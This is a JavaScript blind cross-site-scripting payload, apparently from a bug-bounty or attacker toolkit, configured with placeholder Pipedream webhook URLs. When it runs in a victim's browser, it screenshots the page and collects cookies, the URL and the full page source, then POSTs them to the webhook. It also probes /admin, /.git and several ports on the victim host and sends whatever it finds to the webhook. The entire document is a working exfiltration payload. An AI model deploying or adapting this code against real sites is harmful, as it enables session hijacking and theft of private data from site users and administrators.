// Change this to your pipedream workflow for basic detection
const basic_webhook_url = "https://something.m.pipedream.net"; // for basic info
const advanced_webhook_url = "https://otherthing.m.pipedream.net"; // to get advanced info listed below

// Specify paths to be found whenever the payload will be fired
const paths = ['/admin', '/.git']; // advanced info

// Specify ports to be scanned for a web server running
const ports = [80, 443, 8080, 8443, 5500, 8008, 591]; // advanced info

// Do not edit lines below
// ============================================
var lib_loaded = 0;
function utoa(str) {
    return window.btoa(unescape(encodeURIComponent(str)));
}

// Function that will generate an ID for fire
function make_id(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const fire_id = make_id(15);

// Function that loads required libraries
function load_libraries() {
    // Load jquery
    const jquery_script = document.createElement("script");
    jquery_script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js';
    jquery_script.type = 'text/javascript';
    jquery_script.addEventListener('load', () => {

    });
    document.body.appendChild(jquery_script);
    lib_loaded = lib_loaded + 1;

    // Load html2canvas
    const html2canvas_script = document.createElement("script");
    html2canvas_script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
    html2canvas_script.type = 'text/javascript';
    html2canvas_script.addEventListener('load', () => {

    });
    document.body.appendChild(html2canvas_script);
    lib_loaded = lib_loaded + 1;
}
load_libraries();

// The function that will push additional info to the server
function push_addition_pgs_to_svr(url, response, type) {
    console.log(url);
    console.log(type);
    $.ajax({
        timeout: 5,
        url: (advanced_webhook_url + "/" + type),
        async: false,
        type: "POST",
        data: {
            url: url,
            page_source: utoa(response),
            id: fire_id
        },
        dataType: "html"
    });
}

// The function that will search for paths specified in paths variable
function search_additional_pages() {
    if (document.location.port != "") {
        var port = ":" + document.location.port;
    } else {
        var port = '';
    }
    if (paths != []) {
        for (path in paths) {
            console.log(document.location.protocol + "//" + document.location.hostname + port + paths[path])
            $.ajax({
                timeout: 5,
                url: (document.location.protocol + "//" + document.location.hostname + port + paths[path]),
                async: false,
                success: function (text) {
                    var response = text;
                    push_addition_pgs_to_svr((document.location.protocol + "//" + document.location.hostname + port + paths[path]), response, "paths");
                }
            });
        }
    }
}

function search_http_ports() {
    if (ports != []) {
        for (port in ports) {
            console.log(ports[port])
            $.ajax({
                timeout: 5,
                url: ("http://" + document.location.hostname + ":" + ports[port]),
                async: false,
                success: function (text) {
                    var resp = text;
                    push_addition_pgs_to_svr(("http://" + document.location.hostname + ":" + ports[port]), resp, "ports")
                }
            });
            $.ajax({
                timeout: 5,
                url: ("https://" + document.location.hostname + ":" + ports[port]),
                async: false,
                success: function (text) {
                    var resp = text;
                    push_addition_pgs_to_svr(("https://" + document.location.hostname + ":" + ports[port]), resp, "ports")
                }
            });
        }
    }
}

// This function posts all basic info of the webpage,
// that are cookies, page URL, system date, page
// source and screenshot.
function send_pg_info() {
    const screenshotTarget = document.body;
    html2canvas(screenshotTarget).then(canvas => {
        document.body.appendChild(canvas);
        canvas.style.display = "none";
        dataURL = canvas.toDataURL();
        var cookies = document.cookie;
        var pg_url = document.URL;
        var system_date = Date();
        var pg_source_b64 = utoa(document.querySelector('html').innerHTML);
        var id = fire_id;
        $.ajax({
            timeout: 5,
            url: (basic_webhook_url + "/pg_info"),
            async: false,
            type: "POST",
            data: {
                cookies: cookies,
                page_url: pg_url,
                date: system_date,
                page_source: pg_source_b64,
                image: dataURL,
                id: id
            },
            dataType: "html"
        });
    });
}

// delay for libraries to be loaded
var delayInMilliseconds = 3000; // 3 second

setTimeout(function () {
    send_pg_info();
    search_additional_pages();
    search_http_ports();
}, delayInMilliseconds);
